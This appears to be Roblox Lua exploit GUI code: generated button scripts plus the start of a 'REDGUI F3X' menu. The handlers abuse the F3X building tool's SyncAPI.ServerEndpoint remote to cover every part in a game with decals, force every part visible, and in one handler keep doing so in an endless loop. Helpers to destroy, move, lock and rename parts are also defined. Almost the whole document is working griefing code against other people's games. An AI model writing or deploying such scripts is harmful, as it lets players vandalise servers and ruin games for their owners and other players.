				if v.Name == "SyncAPI" then
					tool = v.Parent
					break
				end
			end
		end
	
		--craaa
		local remote = tool.SyncAPI.ServerEndpoint
	
		-- Helper to get every BasePart in Workspace (same as yours)
		local function GetPartsFromSelection(Selection)
			local Parts = {}
			for _, Descendant in ipairs(Selection:GetDescendants()) do
				if Descendant:IsA("BasePart") and Descendant.Name ~= "Terrain" and Descendant.Name ~= "Sky" then
					table.insert(Parts, Descendant)
				end
			end
			return Parts
		end
	
		local getfuckedlol = GetPartsFromSelection(game:GetService("Workspace"))
	
		-- Decal functions (same as yours, now reusable)
		local function SpawnDecal(side)
			local shitass = {}
			for _, Part in ipairs(getfuckedlol) do
				table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal" })
			end
			remote:InvokeServer('CreateTextures', shitass)
		end
	
		local function AddDecal(texture, side)
			local shitass = {}
			for _, Part in ipairs(getfuckedlol) do
				table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal", Texture = "rbxassetid://" .. texture })
			end
			remote:InvokeServer('SyncTexture', shitass)
		end
	
		-- All your building functions (defined only once)
		local function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		local function SetCollision(part, boolean)
			local args = { "SyncCollision", { { ["Part"] = part, ["CanCollide"] = boolean } } }
			_(args)
		end
	
		local function SetAnchor(boolean, part)
			local args = { "SyncAnchor", { { ["Part"] = part, ["Anchored"] = boolean } } }
			_(args)
		end
	
		local function CreatePart(cf, parent)
			local args = { "CreatePart", "Normal", cf, parent }
			_(args)
		end
	
		local function DestroyPart(part)
			local args = { "Remove", { part } }
			_(args)
		end
	
		local function MovePart(part, cf)
			local args = { "SyncMove", { { ["Part"] = part, ["CFrame"] = cf } } }
			_(args)
		end
	
		local function Resize(part, size, cf)
			local args = { "SyncResize", { { ["Part"] = part, ["CFrame"] = cf, ["Size"] = size } } }
			_(args)
		end
	
		local function AddMesh(part)
			local args = { "CreateMeshes", { { ["Part"] = part } } }
			_(args)
		end
	
		local function SetMesh(part, meshid)
			local args = { "SyncMesh", { { ["Part"] = part, ["MeshId"] = "rbxassetid://" .. meshid } } }
			_(args)
		end
	
		local function SetTexture(part, texid)
			local args = { "SyncMesh", { { ["Part"] = part, ["TextureId"] = "rbxassetid://" .. texid } } }
			_(args)
		end
	
		local function SetName(part, stringg)
			local args = { "SetName", { part }, stringg }
			_(args)
		end
	
		local function MeshResize(part, size)
			local args = { "SyncMesh", { { ["Part"] = part, ["Scale"] = size } } }
			_(args)
		end
	
		local function Weld(part1, part2, lead)
			local args = { "CreateWelds", { part1, part2 }, lead }
			_(args)
		end
	
		local function SetLocked(part, boolean)
			local args = { "SetLocked", { part }, boolean }
			_(args)
		end
	
		local function SetTrans(part, int)
			local args = { "SyncMaterial", { { ["Part"] = part, ["Transparency"] = int } } }
			_(args)
		end
	
		local function CreateSpotlight(part)
			local args = { "CreateLights", { { ["Part"] = part, ["LightType"] = "SpotLight" } } }
			_(args)
		end
	
		local function SyncLighting(part, brightness)
			local args = { "SyncLighting", { { ["Part"] = part, ["LightType"] = "SpotLight", ["Brightness"] = brightness } } }
			_(args)
		end
	
		local function Color(part, color)
			local args = { "SyncColor", { { ["Part"] = part, ["Color"] = color, ["UnionColoring"] = false } } }
			_(args)
		end
	
		local function SpawnDecalSingle(part, side)  -- renamed to avoid conflict
			local args = { "CreateTextures", { { ["Part"] = part, ["Face"] = side, ["TextureType"] = "Decal" } } }
			_(args)
		end
	
		local function AddDecalSingle(part, asset, side)
			local args = { "SyncTexture", { { ["Part"] = part, ["Face"] = side, ["TextureType"] = "Decal", ["Texture"] = "rbxassetid://" .. asset } } }
			_(args)
		end
	
		-- Your spam function (makes everything fully visible)
		local function spam()
			for _, v in ipairs(game.Workspace:GetDescendants()) do
				if v:IsA("BasePart") then
					spawn(function()
						SetTrans(v, 0)  -- math.random(0,0) is always 0
					end)
				end
			end
		end
	
		-- ==================== THE LOOP ====================
		local textureIds = {
			169585459,
			169585475,
			169585485,
			169585502,
			169585515,
			169585502,  -- repeats from your paste
			169585485,
			169585475
		}
	
	
	
		while true do
			for _, id in ipairs(textureIds) do
				-- Apply decal to ALL 6 faces (exactly like your original blocks)
				SpawnDecal(Enum.NormalId.Front)
				AddDecal(id, Enum.NormalId.Front)
	
				SpawnDecal(Enum.NormalId.Back)
				AddDecal(id, Enum.NormalId.Back)
	
				SpawnDecal(Enum.NormalId.Right)
				AddDecal(id, Enum.NormalId.Right)
	
				SpawnDecal(Enum.NormalId.Left)
				AddDecal(id, Enum.NormalId.Left)
	
				SpawnDecal(Enum.NormalId.Bottom)
				AddDecal(id, Enum.NormalId.Bottom)
	
				SpawnDecal(Enum.NormalId.Top)
				AddDecal(id, Enum.NormalId.Top)
	
				spam()  -- force everything visible after each texture change
	
				wait(0.01)  -- small delay (change this number to make it faster/slower)
			end
		end
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_20);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_22()
local script = G2L["22"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		-- made by 1sw0rd1 aka deletecar, DO NOT LEAK OR GIVE WITHOUT MY PERMISSION.
	
		id = 131981357660636
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
	
		function GetPartsFromSelection(Selection)
	
			local Parts = {}
	
	
			for _, Descendant in pairs(Selection:GetDescendants()) do
	
				if Descendant:IsA 'BasePart' and Descendant.Name ~= "Terrain" and Descendant.Name ~= "Sky" then
	
					Parts[#Parts + 1] = Descendant
	
				end
	
			end
	
	
			-- Return parts
	
			return Parts
	
		end
	
		local getfuckedlol = GetPartsFromSelection(game:GetService("Workspace"))
	
		function SpawnDecal(side)
			local shitass = {}
	
			for _, Part in pairs(getfuckedlol) do
				-- Create the change request for this part
	
				table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal" });
			end;
	
	
			-- Send the change to the server
	
			remote:InvokeServer('CreateTextures', shitass);
		end
	
		function AddDecal(texture,side)
			local shitass = {}
	
			for _, Part in pairs(getfuckedlol) do
				-- Create the change request for this part
	
				table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal", Texture = "rbxassetid://"..texture });
			end;
	
	
			-- Send the change to the server
	
			remote:InvokeServer('SyncTexture', shitass);
		end
	
		SpawnDecal(Enum.NormalId.Front)
		AddDecal(id,Enum.NormalId.Front)
	
		SpawnDecal(Enum.NormalId.Back)
		AddDecal(id,Enum.NormalId.Back)
	
		SpawnDecal(Enum.NormalId.Right)
		AddDecal(id,Enum.NormalId.Right)
	
		SpawnDecal(Enum.NormalId.Left)
		AddDecal(id,Enum.NormalId.Left)
	
		SpawnDecal(Enum.NormalId.Bottom)
		AddDecal(id,Enum.NormalId.Bottom)
	
		SpawnDecal(Enum.NormalId.Top)
		AddDecal(id,Enum.NormalId.Top)
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function spam()
			for i,v in game.workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetTrans(v,math.random(0,0))
					end)
				end
			end 
		end
		spam()
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_22);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_24()
local script = G2L["24"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		-- made by 1sw0rd1 aka deletecar, DO NOT LEAK OR GIVE WITHOUT MY PERMISSION.
	
		id = 8186164666
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
	
		function GetPartsFromSelection(Selection)
	
			local Parts = {}
	
	
			for _, Descendant in pairs(Selection:GetDescendants()) do
	
				if Descendant:IsA 'BasePart' and Descendant.Name ~= "Terrain" and Descendant.Name ~= "Sky" then
	
					Parts[#Parts + 1] = Descendant
	
				end
	
			end
	
	
			-- Return parts
	
			return Parts
	
		end
	
		local getfuckedlol = GetPartsFromSelection(game:GetService("Workspace"))
	
		function SpawnDecal(side)
			local shitass = {}
	
			for _, Part in pairs(getfuckedlol) do
				-- Create the change request for this part
	
				table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal" });
			end;
	
	
			-- Send the change to the server
	
			remote:InvokeServer('CreateTextures', shitass);
		end
	
		function AddDecal(texture,side)
			local shitass = {}
	
			for _, Part in pairs(getfuckedlol) do
				-- Create the change request for this part
	
				table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal", Texture = "rbxassetid://"..texture });
			end;
	
	
			-- Send the change to the server
	
			remote:InvokeServer('SyncTexture', shitass);
		end
	
		SpawnDecal(Enum.NormalId.Front)
		AddDecal(id,Enum.NormalId.Front)
	
		SpawnDecal(Enum.NormalId.Back)
		AddDecal(id,Enum.NormalId.Back)
	
		SpawnDecal(Enum.NormalId.Right)
		AddDecal(id,Enum.NormalId.Right)
	
		SpawnDecal(Enum.NormalId.Left)
		AddDecal(id,Enum.NormalId.Left)
	
		SpawnDecal(Enum.NormalId.Bottom)
		AddDecal(id,Enum.NormalId.Bottom)
	
		SpawnDecal(Enum.NormalId.Top)
		AddDecal(id,Enum.NormalId.Top)
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function spam()
			for i,v in game.workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetTrans(v,math.random(0,0))
					end)
				end
			end 
		end
		spam()
	
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_24);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_26()
local script = G2L["26"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
	--[[
		WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
	]]
		local p1 = Instance.new("ScreenGui")
		local ye = Instance.new("Frame")
		local e = Instance.new("ImageLabel")
		local ye_2 = Instance.new("ScrollingFrame")
		local r = Instance.new("TextLabel")
		local jeje = Instance.new("ImageLabel")
		local b = Instance.new("TextButton")
		local b_2 = Instance.new("TextButton")
		local b_3 = Instance.new("TextButton")
		local b_4 = Instance.new("TextButton")
		local b_5 = Instance.new("TextButton")
		local b_6 = Instance.new("TextButton")
		local b_7 = Instance.new("TextButton")
		local b_8 = Instance.new("TextButton")
		local b_9 = Instance.new("TextButton")
		local b_10 = Instance.new("TextButton")
		local b_11 = Instance.new("TextButton")
		local b_12 = Instance.new("TextButton")
		local jeje_2 = Instance.new("ImageLabel")
		local b_13 = Instance.new("TextButton")
		local b_14 = Instance.new("TextButton")
		local b_15 = Instance.new("TextButton")
		local b_16 = Instance.new("TextButton")
		local b_17 = Instance.new("TextButton")
		local b_18 = Instance.new("TextButton")
		local b_19 = Instance.new("TextButton")
		local b_20 = Instance.new("TextButton")
		local b_21 = Instance.new("TextButton")
		local b_22 = Instance.new("TextButton")
		local b_23 = Instance.new("TextButton")
		local b_24 = Instance.new("TextButton")
		local b_25 = Instance.new("TextButton")
		local b_26 = Instance.new("TextButton")
		local b_27 = Instance.new("TextButton")
		local b_28 = Instance.new("TextButton")
		local b_29 = Instance.new("TextButton")
		local b_30 = Instance.new("TextButton")
		local b_31 = Instance.new("TextButton")
		local b_32 = Instance.new("TextButton")
		local b_33 = Instance.new("TextButton")
		local jeje_3 = Instance.new("ImageLabel")
		local b_34 = Instance.new("TextButton")
		local b_35 = Instance.new("TextButton")
		local b_36 = Instance.new("TextButton")
		local b_37 = Instance.new("TextButton")
		local e_2 = Instance.new("TextButton")
		local e_3 = Instance.new("TextButton")
		local e_4 = Instance.new("TextButton")
		local e_5 = Instance.new("TextButton")
		local e_6 = Instance.new("TextButton")
		local e_7 = Instance.new("TextButton")
		local e_8 = Instance.new("TextButton")
		local e_9 = Instance.new("TextButton")
		local e_10 = Instance.new("TextButton")
		local e_11 = Instance.new("TextButton")
		local e_12 = Instance.new("TextButton")
		local e_13 = Instance.new("TextButton")
		local e_14 = Instance.new("TextButton")
		local e_15 = Instance.new("TextButton")
		local e_16 = Instance.new("TextButton")
		local e_17 = Instance.new("TextButton")
		local e_18 = Instance.new("TextButton")
		local e_19 = Instance.new("TextButton")
		local e_20 = Instance.new("TextButton")
		local e_21 = Instance.new("TextButton")
		local e_22 = Instance.new("TextButton")
		local e_23 = Instance.new("TextButton")
		local e_24 = Instance.new("TextButton")
		local e_25 = Instance.new("TextButton")
		local e_26 = Instance.new("TextButton")
		local e_27 = Instance.new("TextButton")
		local e_28 = Instance.new("TextButton")
		local e_29 = Instance.new("TextButton")
		local e_30 = Instance.new("TextButton")
		local e_31 = Instance.new("TextButton")
		local e_32 = Instance.new("TextButton")
		local e_33 = Instance.new("TextButton")
		local e_34 = Instance.new("TextButton")
		local e_35 = Instance.new("TextButton")
		local b_38 = Instance.new("TextButton")
		local b_39 = Instance.new("TextButton")
	
		--Properties:
	
		p1.Name = "p1"
		p1.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
		p1.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	
		ye.Name = "ye"
		ye.Parent = p1
		ye.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		ye.BorderColor3 = Color3.fromRGB(255, 0, 0)
		ye.BorderSizePixel = 5
		ye.Position = UDim2.new(0, 379, 0, 130)
		ye.Size = UDim2.new(0, 413, 0, 540)
	
		e.Name = "e"
		e.Parent = ye
		e.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		e.BorderColor3 = Color3.fromRGB(0, 0, 0)
		e.BorderSizePixel = 0
		e.Position = UDim2.new(0.0314769968, 0, 0.0166666675, 0)
		e.Size = UDim2.new(0, 387, 0, 521)
		e.Image = "rbxassetid://124621483096928"
		e.ImageTransparency = 0.370
	
		ye_2.Name = "ye"
		ye_2.Parent = e
		ye_2.Active = true
		ye_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ye_2.BackgroundTransparency = 1.000
		ye_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
		ye_2.BorderSizePixel = 0
		ye_2.Position = UDim2.new(-0.000814235769, 0, -0.00247409102, 0)
		ye_2.Size = UDim2.new(0, 387, 0, 522)
		ye_2.CanvasPosition = Vector2.new(0, 100)
	
		r.Name = "r"
		r.Parent = ye_2
		r.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		r.BackgroundTransparency = 1.000
		r.BorderColor3 = Color3.fromRGB(0, 0, 0)
		r.BorderSizePixel = 0
		r.Position = UDim2.new(0.176580697, 0, 0.000959692872, 0)
		r.Size = UDim2.new(0, 503, 0, 50)
		r.Font = Enum.Font.SourceSans
		r.Text = ""
		r.TextColor3 = Color3.fromRGB(255, 255, 255)
		r.TextScaled = true
		r.TextSize = 14.000
		r.TextWrapped = true
	
		jeje.Name = "jeje"
		jeje.Parent = r
		jeje.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		jeje.BackgroundTransparency = 1.000
		jeje.BorderColor3 = Color3.fromRGB(0, 0, 0)
		jeje.BorderSizePixel = 0
		jeje.Position = UDim2.new(-0.0258449297, 0, 0, 0)
		jeje.Size = UDim2.new(0, 278, 0, 50)
		jeje.Image = "rbxassetid://129275895571901"
	
		b.Name = "b"
		b.Parent = r
		b.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b.Position = UDim2.new(-0.0810497701, 0, 7.05818462, 0)
		b.Size = UDim2.new(0, 98, 0, 29)
		b.Font = Enum.Font.Roboto
		b.Text = "Billboard all"
		b.TextColor3 = Color3.fromRGB(255, 255, 255)
		b.TextScaled = true
		b.TextSize = 14.000
		b.TextWrapped = true
	
		b_2.Name = "b"
		b_2.Parent = r
		b_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_2.Position = UDim2.new(0.841616571, 0, 3.47369266, 0)
		b_2.Size = UDim2.new(0, 98, 0, 29)
		b_2.Font = Enum.Font.Roboto
		b_2.Text = "NAME ALL"
		b_2.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_2.TextScaled = true
		b_2.TextSize = 14.000
		b_2.TextWrapped = true
	
		b_3.Name = "b"
		b_3.Parent = r
		b_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_3.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_3.Position = UDim2.new(0.374282032, 0, 8.81777477, 0)
		b_3.Size = UDim2.new(0, 98, 0, 29)
		b_3.Font = Enum.Font.Roboto
		b_3.Text = "Baby Giraffes"
		b_3.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_3.TextScaled = true
		b_3.TextSize = 14.000
		b_3.TextWrapped = true
	
		b_4.Name = "b"
		b_4.Parent = r
		b_4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_4.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_4.Position = UDim2.new(0.370515913, 0, 4.30245113, 0)
		b_4.Size = UDim2.new(0, 98, 0, 29)
		b_4.Font = Enum.Font.Roboto
		b_4.Text = "REDGUI F3X V1 BETA"
		b_4.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_4.TextScaled = true
		b_4.TextSize = 14.000
		b_4.TextWrapped = true
	
		b_5.Name = "b"
		b_5.Parent = r
		b_5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_5.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_5.Position = UDim2.new(0.378388852, 0, 5.19413185, 0)
		b_5.Size = UDim2.new(0, 98, 0, 29)
		b_5.Font = Enum.Font.Roboto
		b_5.Text = "nyan cat"
		b_5.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_5.TextScaled = true
		b_5.TextSize = 14.000
		b_5.TextWrapped = true
	
		b_6.Name = "b"
		b_6.Parent = r
		b_6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_6.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_6.Position = UDim2.new(-0.0799144357, 0, 5.18183851, 0)
		b_6.Size = UDim2.new(0, 98, 0, 29)
		b_6.Font = Enum.Font.Roboto
		b_6.Text = "Transparent Character"
		b_6.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_6.TextScaled = true
		b_6.TextSize = 14.000
		b_6.TextWrapped = true
	
		b_7.Name = "b"
		b_7.Parent = r
		b_7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_7.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_7.Position = UDim2.new(1.07793152, 0, 2.64067984, 0)
		b_7.Size = UDim2.new(0, 98, 0, 29)
		b_7.Font = Enum.Font.Roboto
		b_7.Text = "gold av."
		b_7.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_7.TextScaled = true
		b_7.TextSize = 14.000
		b_7.TextWrapped = true
	
		b_8.Name = "b"
		b_8.Parent = r
		b_8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_8.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_8.Position = UDim2.new(-0.0834994912, 0, 1.81486082, 0)
		b_8.Size = UDim2.new(0, 98, 0, 29)
		b_8.Font = Enum.Font.Roboto
		b_8.Text = "Disco Character"
		b_8.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_8.TextScaled = true
		b_8.TextSize = 14.000
		b_8.TextWrapped = true
	
		b_9.Name = "b"
		b_9.Parent = r
		b_9.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_9.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_9.Position = UDim2.new(0.151014566, 0, 7.05999994, 0)
		b_9.Size = UDim2.new(0, 98, 0, 29)
		b_9.Font = Enum.Font.Roboto
		b_9.Text = "SPIN HEAD"
		b_9.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_9.TextScaled = true
		b_9.TextSize = 14.000
		b_9.TextWrapped = true
	
		b_10.Name = "b"
		b_10.Parent = r
		b_10.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_10.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_10.Position = UDim2.new(0.84027487, 0, 2.66957831, 0)
		b_10.Size = UDim2.new(0, 98, 0, 29)
		b_10.Font = Enum.Font.Roboto
		b_10.Text = "Baseplate"
		b_10.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_10.TextScaled = true
		b_10.TextSize = 14.000
		b_10.TextWrapped = true
	
		b_11.Name = "b"
		b_11.Parent = r
		b_11.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_11.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_11.Position = UDim2.new(0.845916331, 0, 5.19414902, 0)
		b_11.Size = UDim2.new(0, 98, 0, 29)
		b_11.Font = Enum.Font.Roboto
		b_11.Text = "Fire f3x"
		b_11.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_11.TextScaled = true
		b_11.TextSize = 14.000
		b_11.TextWrapped = true
	
		b_12.Name = "b"
		b_12.Parent = r
		b_12.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		b_12.BorderColor3 = Color3.fromRGB(255, 0, 0)
		b_12.Position = UDim2.new(0.150605276, 0, 5.19777346, 0)
		b_12.Size = UDim2.new(0, 98, 0, 29)
		b_12.Font = Enum.Font.Roboto
		b_12.Text = "funk"
		b_12.TextColor3 = Color3.fromRGB(255, 255, 255)
		b_12.TextScaled = true
		b_12.TextSize = 14.000
		b_12.TextWrapped = true
	
		jeje_2.Name = "jeje"
		jeje_2.Parent = r
		jeje_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		jeje_2.BackgroundTransparency = 1.000
		jeje_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
		jeje_2.BorderSizePixel = 0
